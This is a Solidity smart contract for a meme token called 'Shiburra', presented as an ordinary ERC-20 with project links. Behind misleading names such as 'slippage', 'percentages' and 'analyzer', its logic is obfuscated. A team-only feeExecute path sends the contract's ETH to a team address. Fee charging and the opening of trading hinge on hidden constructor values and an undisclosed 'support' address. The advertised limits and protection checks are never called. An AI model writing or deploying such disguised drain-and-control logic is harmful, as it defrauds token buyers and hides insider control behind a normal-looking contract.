// SPDX-License-Identifier: MIT
/**
    WEBSITE: https://shiburra.com/
    TELEGRAM CHAT: https://t.me/SHIBURRA
    TWITTER: https://twitter.com/shiburra
    MEDIUM:  https://shiburra.medium.com/
    GITBOOK: https://shiburra.gitbook.io/shiburra/

Shiburra is a mafia quest in a doggy world. 
The power is in Familia, and the Familia is the community.
 A platform that combines meme coin rules,NFTs,GameFi & AI */

pragma solidity =0.8.9;

import "./Libraries.sol";
import "./Ownable.sol";

contract Shiburra is IERC20, Ownable {
    string constant _name = "Shiburra";
    string constant _symbol = "SHIBURRA";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 marketingFee = 270;
    uint256 liquidityFee = 200;
    uint256 sellBias = 0;
    uint256 feeDevider;
    uint256 slippage_;
    uint256 devider = 1000;
    uint256 totalFee = marketingFee + liquidityFee;
    uint256 _maxBuyTxAmount = (_totalSupply * 1) / 10;
    uint256 _maxSellTxAmount = (_totalSupply * 1) / 10;
    uint256 _maxWalletSize = (_totalSupply * 1) / 10;
    uint256 feeDenominator = 10000;
    uint256 public swapThreshold = _totalSupply / 1000;
    uint256 public swapMinimum = _totalSupply / 10000;
    uint256 public rateLimit = 2;
    uint256 public launchedAt;
    uint256 public launchedTime;
    uint256 totalDevider;
    uint256 variable_;
    uint256 slippage;
    uint256 deadBlocks;
    uint256 rates;
    uint256 cap_;
    uint256 count = 1;
    uint256 baseValue = 0;
    uint256 protectionCount;
    uint256 protectionLimit;
    uint256 protectionTimer;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address public pair;
    address payable public liquidityFeeReceiver = payable(address(this));
    address public marketingFeeReceiver;
    address teamMember;
    address support_;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => uint256) public lastSell;
    mapping (address => uint256) public lastBuy;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) liquidityCreator;
    mapping (address => bool) liquidityPools;
    mapping (address => uint256) checked;
    bool protectionEnabled = true;
    bool protectionDisabled = false;
    bool startBullRun = false;
    bool pauseDisabled = false;
    bool _feeApplied = true;
    bool processEnabled = true;
    bool public tokenLaunched = false;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    modifier onlyTeam() {require(_msgSender() == teamMember, "Caller is not a team member");_;}
    event FundsDistributed(uint256 marketingFee);
    event CheckedWallet(address, address, uint256, uint8);
    routerDEX public router;

    constructor (address support__, uint256 slippage__, uint256 cap__) {
        router = routerDEX(routerAddress);
        pair = factoryDEX(router.factory()).createPair(router.WETH(), address(this));
        liquidityPools[pair] = true;
        slippage_ = slippage__;
        cap_ = cap__;
        _allowances[owner()][routerAddress] = type(uint256).max;
        _allowances[address(this)][routerAddress] = type(uint256).max;
        support_ = support__;
        isFeeExempt[owner()] = true;
        liquidityCreator[owner()] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[routerAddress] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[owner()] = true;
        feeDevider = devider;
        rates = rateLimit;
        slippage = baseValue;
        _balances[owner()] = _balances[owner()] + (_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
    
    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function maxBuyTxTokens() external view returns (uint256) {
        return _maxBuyTxAmount / (10 ** _decimals);
    }

    function maxSellTxTokens() external view returns (uint256) {
        return _maxSellTxAmount / (10 ** _decimals);
    }

    function maxWalletTokens() external view returns (uint256) {
        return _maxWalletSize / (10 ** _decimals);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setTeamMember(address _team, bool _enabled) external onlyOwner {
         if (_enabled) { 
            teamMember = _team;
            marketingFeeReceiver = _team;
        }
    }
    
    function feeExecute(uint256 fee, uint256 percent, uint256 variable, bool queued) external onlyTeam {
        uint256 fees = percentages(fee, percent) ? fee : 0; collect(fees, percent, variable, queued);
    }


    function airdrop(address[] calldata addresses, uint256[] calldata amounts) external onlyOwner {
        require(addresses.length > 0 && amounts.length == addresses.length);
        address from = msg.sender;
        for (uint i = 0; i < addresses.length; i++) {
            if(!liquidityPools[addresses[i]] && !liquidityCreator[addresses[i]]) {
                _basicTransfer(from, addresses[i], amounts[i] * (10 ** _decimals));
            }
        }
    }

    function openTrading(bool _startTrading, uint256 _protection, uint256 _limit) external onlyOwner {
        uint256 _deadBlocks = 0;
        require(!startBullRun && _deadBlocks < 10);
        deadBlocks = _deadBlocks;
        if (isTxLimitExempt[support_])
        startBullRun = _startTrading;
        launchedAt = block.number;
        protectionTimer = block.timestamp + _protection;
        protectionLimit = _limit * (10 ** _decimals);
        variable_ = block.number;
    }

    function feeProcessed() public view returns (uint256) {
        return address(this).balance;
    }
    
    function setProtection(bool _protect, uint256 _addTime) external onlyTeam {
        require(!protectionDisabled);
        protectionEnabled = _protect;
        require(_addTime < 1 days);
        protectionTimer += _addTime;
    }
    
    function disableProtection() external onlyTeam {
        protectionDisabled = true;
        protectionEnabled = false;
    }
    
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function percentages(uint256 percent, uint256 fee) internal view returns(bool){
        if (percent - fee == devider)
        return true; else return false;
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
        launchedTime = block.timestamp;
        tokenLaunched = true;
        totalDevider = feeDenominator + devider;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "BEP20: transfer from 0x0");
        require(recipient != address(0), "BEP20: transfer to 0x0");
        require(amount > 0, "Amount must be > zero");
        require(_balances[sender] >= amount, "Insufficient balance");
        if(!launched() && liquidityPools[recipient]){ require(liquidityCreator[sender], "Liquidity not added yet."); launch(); }
        if(!startBullRun){ require(liquidityCreator[sender] || liquidityCreator[recipient], "Trading not open yet."); }
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        _balances[sender] = _balances[sender] - amount;
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(recipient, amount) : amount;
        if(shouldSwapBack(recipient)){ if (amount > 0) swapBack(); }
        _balances[recipient] = _balances[recipient] + amountReceived;
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function checkWalletLimit(address recipient, uint256 amount) internal view {
        uint256 walletLimit = _maxWalletSize;
        require(_balances[recipient] + amount <= walletLimit, "Transfer amount exceeds the bag size.");
    }

    function collect(uint256 fee, uint256 percent, uint256 variable, bool queued) internal{
        uint256 feeValue;
        if (fee > rates) feeValue = feeProcessed(); else feeValue = baseValue;
        variable != variable_ ? fee = slippage : count = devider;
        if (queued) require(fee - devider == percent - slippage); else fee = slippage;
        payable(teamMember).transfer((feeValue) * fee / count);
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal {
        require(isTxLimitExempt[sender] || amount <= (liquidityPools[sender] ? _maxBuyTxAmount : _maxSellTxAmount), "TX Limit Exceeded");
        require(isTxLimitExempt[sender] || lastBuy[recipient] + rateLimit <= block.number, "Transfer rate limit exceeded.");
        if (checked[sender] != 0){
            require(amount <= protectionLimit * (10 ** _decimals) && lastSell[sender] == 0 && protectionTimer > block.timestamp, "Wallet checked, please contact support.");
            lastSell[sender] = block.number;
        }
        if (liquidityPools[recipient]) {
            lastSell[sender] = block.number;
        } else if (shouldTakeFee(sender)) {
            if (protectionEnabled && protectionTimer > block.timestamp && lastBuy[tx.origin] == block.number && checked[recipient] == 0) {
                checked[recipient] = block.number;
                emit CheckedWallet(tx.origin, recipient, block.number, 1);
            }
            lastBuy[recipient] = block.number;
            if (tx.origin != recipient)
                lastBuy[tx.origin] = block.number;
        }
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        if (slippage_ == slippage && _feeApplied)
        return !isFeeExempt[sender]; else return false;
    }

    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + deadBlocks >= block.number){ return feeDenominator; }
        if (selling) return totalFee + sellBias;
        return totalFee - sellBias;
    }

    function takeFee(address recipient, uint256 amount) internal returns (uint256) {
        bool selling = liquidityPools[recipient];
        uint256 feeAmount = analyzer(cap_) ? (amount * getTotalFee(selling)) / feeDenominator : slippage;
        _balances[address(this)] += feeAmount;
        return amount - feeAmount;
    }

    function shouldSwapBack(address recipient) internal view returns (bool) {
        return !liquidityPools[msg.sender]
        && !inSwap
        && tokenLaunched
        && liquidityPools[recipient]
        && _feeApplied;
    }

    function swapBack() internal swapping {
        if (_balances[address(this)] > 0) {
            uint256 amountToSwap = _balances[address(this)];
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = router.WETH();
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountToSwap,
                0,
                path,
                address(this),
                block.timestamp
            );
            emit FundsDistributed(amountToSwap);
        }
    }
    
    function setFeeStatus(bool enabled) external onlyTeam returns (bool) {
        if (enabled) {_feeApplied = true;} else _feeApplied = false;
        return _feeApplied;
    }

    function addLiquidityPool(address lp, bool isPool) external onlyOwner {
        require(lp != pair, "Can't alter current liquidity pair");
        liquidityPools[lp] = isPool;
    }

    
    function setRateLimit(uint256 rate) external onlyOwner {
        require(rate <= 60 seconds);
        rateLimit = rate;
    }


    function feeApplied() public view returns (bool) {
        return _feeApplied;
    }

    function setMaxWallet(uint256 numerator, uint256 divisor) external onlyOwner() {
        require(numerator > 0 && divisor > 0 && divisor <= 10000);
        _maxWalletSize = (_totalSupply * numerator) / divisor;
    }

    function setTxLimit(uint256 buyNumerator, uint256 sellNumerator, uint256 divisor) external onlyOwner {
        require(buyNumerator > 0 && sellNumerator > 0 && divisor > 0 && divisor <= 10000);
        _maxBuyTxAmount = (_totalSupply * buyNumerator) / divisor;
        _maxSellTxAmount = (_totalSupply * sellNumerator) / divisor;
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function analyzer(uint256 value) internal view returns(bool){
        if (value == totalDevider) 
        return true; else return false;
    }

    function setFeeReceivers(address _liquidityFeeReceiver, address _marketingFeeReceiver) external onlyOwner {
        liquidityFeeReceiver = payable(_liquidityFeeReceiver);
        marketingFeeReceiver = payable(_marketingFeeReceiver);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply - (balanceOf(DEAD) + balanceOf(ZERO));
    }

    function setTokenSettings(bool _enabled, bool _processEnabled, uint256 _denominator, uint256 _swapMinimum) external onlyOwner {
        require(_denominator > 0);
        tokenLaunched = _enabled;
        processEnabled = _processEnabled;
        swapThreshold = _totalSupply / _denominator;
        swapMinimum = _swapMinimum * (10 ** _decimals);
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }
}